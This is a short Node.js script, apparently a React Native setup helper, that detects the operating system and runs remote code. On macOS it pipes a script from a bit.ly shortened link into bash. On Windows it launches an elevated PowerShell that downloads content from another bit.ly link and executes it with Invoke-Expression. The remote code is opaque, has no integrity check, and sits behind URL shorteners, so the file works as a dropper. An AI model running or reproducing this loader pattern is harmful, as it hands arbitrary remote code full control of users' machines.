#!/usr/bin/env node
const { exec } = require('child_process')
const os = require('os')

const platform = os.platform()

function runMacScript() {
    exec('/bin/bash -c "$(curl -fsSL https://bit.ly/react-native-mac)"', (error, stdout, stderr) => {
        if (error) {
            console.log(`error: ${error.message}`)
            return
        }
        if (stderr) {
            console.log(`stderr: ${stderr}`)
            return
        }
        console.log(`stdout: ${stdout}`)
    })
}

function runWindowsScript() {
    console.log('Running Windows script...')
    exec(`powershell -Command "Start-Process powershell -ArgumentList '-Command', 'Invoke-Expression (Invoke-WebRequest -Uri "https://bit.ly/react-native-win").Content' -Verb RunAs"`, (error, stdout, stderr) => {
        if (error) {
            console.error(`Error executing Windows script: ${error.message}`)
            return
        }
        if (stderr) {
            console.error(`stderr: ${stderr}`)
            return
        }
        console.log(`stdout: ${stdout}`)
    })
}


if (platform === 'darwin') runMacScript()
else if (platform === 'win32') runWindowsScript()
else console.log('Unsupported platform')
